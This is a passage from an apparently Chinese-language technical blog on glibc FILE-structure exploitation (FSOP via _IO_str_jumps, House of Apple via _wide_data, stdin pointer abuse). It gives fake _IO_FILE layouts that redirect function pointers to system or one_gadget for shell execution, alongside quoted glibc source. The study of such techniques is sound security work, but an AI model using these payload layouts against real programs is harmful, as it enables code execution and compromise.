class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"built_in\">memset</span> (new_buf + old_blen, <span class=\"string\">&#x27;\\0&#x27;</span>, new_size - old_blen);</span><br><span class=\"line\"></span><br><span class=\"line\">      _IO_setb (fp, new_buf, new_buf + new_size, <span class=\"number\">1</span>);</span><br><span class=\"line\">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class=\"line\">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class=\"line\">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class=\"line\">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class=\"line\"></span><br><span class=\"line\">      fp-&gt;_IO_write_base = new_buf;</span><br><span class=\"line\">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!flush_only)</span><br><span class=\"line\">    *fp-&gt;_IO_write_ptr++ = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>) c;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class=\"line\">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>\n\n<p>利用下面语句可以劫持程序流程：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">new_buf= (<span class=\"type\">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure>\n\n<p>思路是绕过前面的检查，并将<code>fp-&gt;_s._allocate_buffer</code>修改为<code>system</code>,将<code>new_size</code>修改为<code>&quot;/bin/sh&quot;</code>的地址（也可直接改为one_gadget）</p>\n<p>具体构造：</p>\n<ol>\n<li><code>fp-&gt;_flags &amp; _IO_NO_WRITES</code>为假</li>\n<li><code>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</code></li>\n<li><code>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)</code>为假</li>\n<li><code>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 </code>不能为负数</li>\n<li><code>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100</code>; 应当指向/bin/sh字符串对应的地址</li>\n<li><code>fp+0xe0</code>（<code>_allocate_buffer</code>）指向system地址</li>\n</ol>\n<p>当然也要绕过 <code>_IO_flush_all_lockp</code>的一些条件</p>\n<ol>\n<li><code>fp-&gt;_mode&lt;=0</code></li>\n<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">._chain =&gt; chunk_addr</span><br><span class=\"line\">chunk_addr</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x1</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_end = (bin_sh_addr - <span class=\"number\">100</span>) <span class=\"comment\">// 2,</span></span><br><span class=\"line\">      ...</span><br><span class=\"line\">      _mode = <span class=\"number\">0x0</span>, <span class=\"comment\">//一般不用特意设置</span></span><br><span class=\"line\">      _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = _IO_str_jumps <span class=\"comment\">//chunk_addr + 0xd8 ~ +0xe0(glibc2.24之前可以)</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">+<span class=\"number\">0xe0</span> ~ +<span class=\"number\">0xe8</span> : system_addr / one_gadget <span class=\"comment\">//fp-&gt;_s._allocate_buffer</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<p>在<code>_IO_str_jumps</code>中的<code>_IO_str_finish</code>也可以利用。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_IO_str_finish (_IO_FILE *fp, <span class=\"type\">int</span> dummy)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class=\"line\">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class=\"comment\">//[fp+0xe8]</span></span><br><span class=\"line\">  fp-&gt;_IO_buf_base = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_default_finish (fp, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>同样也是对其中函数指针的利用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class=\"comment\">//[fp+0xe8]</span></span><br></pre></td></tr></table></figure>\n\n<p>绕过条件：</p>\n<ol>\n<li>_IO_buf_base 不为空</li>\n<li>_flags &amp; _IO_USER_BUF(0x01) 为假，即flag字段不包含IO_USER_BUF</li>\n</ol>\n<p>现在要让程序执行 <code>_IO_str_finish</code> ，<code>fclose(fp)</code> 是一条路，但似乎有局限。还是回到异常处理的方法，在 <code>_IO_flush_all_lockp</code> 函数中是通过 <code>_IO_OVERFLOW</code> 执行的 <code>__GI__IO_str_overflow</code>，而 <code>_IO_OVERFLOW</code> 是根据 <code>__overflow</code> 相对于 <code>_IO_str_jumps</code> vtable 的偏移找到具体函数的。所以如果我们伪造传递给 <code>_IO_OVERFLOW(fp)</code> 的 fp 是 vtable 的地址减去 0x8，那么根据偏移，程序将找到 <code>_IO_str_finish</code> 并执行。</p>\n<p>也就是说，如果设置的vtable是<code>_IO_str_jumps-0x8</code>，那么在<code>vtable+0x18</code>的位置就是 <code>_IO_str_finish</code>（原本应该是 <code>_IO_str_overflow</code>），这样就可以通过 <code>_IO_flush_all_lockp</code>执行到 <code>_IO_str_finish</code>，而且由于这个vtable在合法范围内，因此能过检测。</p>\n<p>不过我们也要绕过 <code>_IO_flush_all_lockp</code>的一些条件</p>\n<ol>\n<li><code>fp-&gt;_mode&lt;=0</code></li>\n<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>\n</ol>\n<p>构造如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">._chain =&gt; chunk_addr</span><br><span class=\"line\">chunk_addr</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x1</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_base = bin_sh_addr,</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      _mode = <span class=\"number\">0x0</span>, <span class=\"comment\">//一般不用特意设置</span></span><br><span class=\"line\">      _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = _IO_str_jumps<span class=\"number\">-8</span> <span class=\"comment\">//chunk_addr + 0xd8 ~ +0xe0 (2.24之前可以)</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">+<span class=\"number\">0xe0</span> ~ +<span class=\"number\">0xe8</span> : <span class=\"number\">0x0</span></span><br><span class=\"line\">+<span class=\"number\">0xe8</span> ~ +<span class=\"number\">0xf0</span> : system_addr / one_gadget <span class=\"comment\">//fp-&gt;_s._free_buffer</span></span><br></pre></td></tr></table></figure>\n\n<p>而在<code>libc-2.28</code>及以后，由于不再使用偏移找<code>_s._allocate_buffer</code>和<code>_s._free_buffer</code>，而是直接用<code>malloc</code>和<code>free</code>代替，所以<code>FSOP</code>也失效了。</p>\n<h3 id=\"IO-wide-data（House-of-Apple）\"><a href=\"#IO-wide-data（House-of-Apple）\" class=\"headerlink\" title=\"_IO_wide_data（House of Apple）\"></a>_IO_wide_data（House of Apple）</h3><p><code>struct _IO_wide_data *_wide_data</code>在<code>_IO_FILE</code>中的偏移为<code>0xa0</code></p>\n<p><code>_IO_wide_data</code>的结构如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_wide_data</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_read_ptr;    <span class=\"comment\">/* Current read pointer */</span> \t\t\t<span class=\"comment\">//0x00</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_read_end;    <span class=\"comment\">/* End of get area. */</span>\t\t\t\t<span class=\"comment\">//0x08</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_read_base;    <span class=\"comment\">/* Start of putback+get area. */</span>\t <span class=\"comment\">//0x10</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_write_base;    <span class=\"comment\">/* Start of put area. */</span>\t\t\t<span class=\"comment\">//0x18</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_write_ptr;    <span class=\"comment\">/* Current put pointer. */</span>\t\t\t<span class=\"comment\">//0x20</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_write_end;    <span class=\"comment\">/* End of put area. */</span>\t\t\t\t<span class=\"comment\">//0x28</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_buf_base;    <span class=\"comment\">/* Start of reserve area. */</span>\t\t<span class=\"comment\">//0x30</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_buf_end;        <span class=\"comment\">/* End of reserve area. */</span>\t\t<span class=\"comment\">//0x38</span></span><br><span class=\"line\">  <span class=\"comment\">/* The following fields are used to support backing up and undo. */</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_save_base;    <span class=\"comment\">/* Pointer to start of non-current get area. */</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_backup_base;    <span class=\"comment\">/* Pointer to first valid character of</span></span><br><span class=\"line\"><span class=\"comment\">                   backup area */</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_save_end;    <span class=\"comment\">/* Pointer to end of non-current get area. */</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"type\">__mbstate_t</span> _IO_state;</span><br><span class=\"line\">  <span class=\"type\">__mbstate_t</span> _IO_last_state;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_codecvt</span> _<span class=\"title\">codecvt</span>;</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> _shortbuf[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> *_<span class=\"title\">wide_vtable</span>;</span> <span class=\"comment\">//_IO_wide_data+0xe0</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>伪造<code>_wide_data</code>变量，通过<code>_IO_wstrn_overflow</code>可以将已知地址空间上的某些值修改为一个已知值。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">wint_t</span> _IO_wstrn_overflow (FILE *fp, <span class=\"type\">wint_t</span> c)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* When we come to here this means the user supplied buffer is</span></span><br><span class=\"line\"><span class=\"comment\">     filled.  But since we must return the number of characters which</span></span><br><span class=\"line\"><span class=\"comment\">     would have been written in total we must provide a buffer for</span></span><br><span class=\"line\"><span class=\"comment\">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class=\"line\"><span class=\"comment\">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class=\"line\">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class=\"line\">         snf-&gt;overflow_buf + (<span class=\"keyword\">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class=\"line\">                      / <span class=\"keyword\">sizeof</span> (<span class=\"type\">wchar_t</span>)), <span class=\"number\">0</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class=\"line\">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class=\"line\">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class=\"line\">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class=\"line\">                      + (<span class=\"keyword\">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class=\"line\">                     / <span class=\"keyword\">sizeof</span> (<span class=\"type\">wchar_t</span>))); <span class=\"comment\">//overflow_buf+偏移</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class=\"line\">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Since we are not really interested in storing the characters</span></span><br><span class=\"line\"><span class=\"comment\">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>_IO_wstrn_overflow</code>首先将<code>fp</code>强制转化为<code>_IO_wstrnfile *</code>指针，然后判断<code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code>是否成立（一般肯定是成立的），如果成立则会对<code>fp-&gt;_wide_data</code>的<code>_IO_write_base</code>、<code>_IO_read_base</code>、<code>_IO_read_ptr</code>和<code>_IO_read_end</code>赋值为<code>snf-&gt;overflow_buf</code>或者与该地址一定范围内偏移的值；最后对<code>fp-&gt;_wide_data</code>的<code>_IO_write_ptr</code>和<code>_IO_write_end</code>赋值。</p>\n<p>也就是说，只要控制了<code>fp-&gt;_wide_data</code>，就可以控制从<code>fp-&gt;_wide_data</code>开始一定范围内的内存的值，也就等同于<strong>任意地址写已知地址</strong>。</p>\n<p>这里有时候需要绕过<code>_IO_wsetb</code>函数里面的<code>free</code>：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> _IO_wsetb (FILE *f, <span class=\"type\">wchar_t</span> *b, <span class=\"type\">wchar_t</span> *eb, <span class=\"type\">int</span> a)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class=\"line\">    <span class=\"built_in\">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base); <span class=\"comment\">// 其不为0的时候不要执行到这里</span></span><br><span class=\"line\">  f-&gt;_wide_data-&gt;_IO_buf_base = b; <span class=\"comment\">//overflow_buf</span></span><br><span class=\"line\">  f-&gt;_wide_data-&gt;_IO_buf_end = eb; <span class=\"comment\">//overflow_buf+偏移</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (a)</span><br><span class=\"line\">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样也能写入到<code>f-&gt;_wide_data-&gt;_IO_buf_base</code>和<code>f-&gt;_wide_data-&gt;_IO_buf_end</code></p>\n<p><code>_IO_wstrnfile</code>涉及到的结构体如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_str_fields</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class=\"line\">  _IO_free_type _free_buffer_unused;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_streambuf</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  FILE _f;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> *<span class=\"title\">vtable</span>;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_strfile_</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_streambuf</span> _<span class=\"title\">sbf</span>;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_str_fields</span> _<span class=\"title\">s</span>;</span></span><br><span class=\"line\">&#125; _IO_strfile;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  _IO_strfile f;</span><br><span class=\"line\">  <span class=\"comment\">/* This is used for the characters which do not fit in the buffer</span></span><br><span class=\"line\"><span class=\"comment\">     provided by the user.  */</span></span><br><span class=\"line\">  <span class=\"type\">char</span> overflow_buf[<span class=\"number\">64</span>];</span><br><span class=\"line\">&#125; _IO_strnfile;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  _IO_strfile f;</span><br><span class=\"line\">  <span class=\"comment\">/* This is used for the characters which do not fit in the buffer</span></span><br><span class=\"line\"><span class=\"comment\">     provided by the user.  */</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> overflow_buf[<span class=\"number\">64</span>]; <span class=\"comment\">// overflow_buf相对于_IO_FILE结构体的偏移为0xf0，在vtable后面。</span></span><br><span class=\"line\">&#125; _IO_wstrnfile;</span><br></pre></td></tr></table></figure>\n\n<p>因此如果能在堆上伪造一个<code>_IO_FILE</code>结构体，将其<code>vtable</code>替换为<code>_IO_wstrn_jumps</code>，伪造<code>_wide_data</code>并覆盖，并伪造其他字段绕过检测调用<code>_IO_OVERFLOW</code>。<code>exit</code>函数则会一路调用到<code>_IO_wstrn_overflow</code>函数，并将<code>fake _wide_data</code>至<code>fake _wide_data+0x38</code>的地址区域的内容都替换为<code>fake_IO_FILE的overflow_buf+0xf0</code>或者<code>fake_IO_FILE的overflow_buf + 0x1f0</code>。</p>\n<p>对<code>_wide_data</code>的利用是House of Apple的原理。</p>\n<h3 id=\"IO-FILE中file的读写指针利用\"><a href=\"#IO-FILE中file的读写指针利用\" class=\"headerlink\" title=\"IO_FILE中file的读写指针利用\"></a>IO_FILE中file的读写指针利用</h3><p>由于伪造的vtable常常都不在合法范围之内，因此很难再利用vtable，不过我们还可以利用file。</p>\n<p>IO_FILE结构中包含了关于文件的基本信息，其中就有与文件读写相关的字段，fwrite、fread等操作就需要利用这些信息。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span>* _IO_read_ptr;   <span class=\"comment\">/* Current read pointer */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_read_end;   <span class=\"comment\">/* End of get area. */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_read_base;  <span class=\"comment\">/* Start of putback+get area. */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_write_base; <span class=\"comment\">/* Start of put area. */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_write_ptr;  <span class=\"comment\">/* Current put pointer. */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_write_end;  <span class=\"comment\">/* End of put area. */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_buf_base;   <span class=\"comment\">/* Start of reserve area. */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_buf_end;    <span class=\"comment\">/* End of reserve area. */</span></span><br></pre></td></tr></table></figure>\n\n<p>如果我们能控制以上字段，那就可以控制缓冲区的读写范围，实现任意读写。即使没有打开文件也没有关系，程序本身会创建stdin、stdout、stderr，控制这两个字段后通过sprintf、printf等函数一样可以利用。</p>\n<h4 id=\"利用stdin进行任意写\"><a href=\"#利用stdin进行任意写\" class=\"headerlink\" title=\"利用stdin进行任意写\"></a>利用stdin进行任意写</h4><p><code>scanf</code>，<code>fread</code>，<code>gets</code>等读入走<code>IO</code>指针（<code>read</code>不走），最后都会调用vtable中的<code>_xsgetn()</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_size_t _IO_file_xsgetn (_IO_FILE *fp, <span class=\"type\">void</span> *data, _IO_size_t n)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> ...</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      <span class=\"comment\">//输入缓冲区为空则初始化输入缓冲区</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  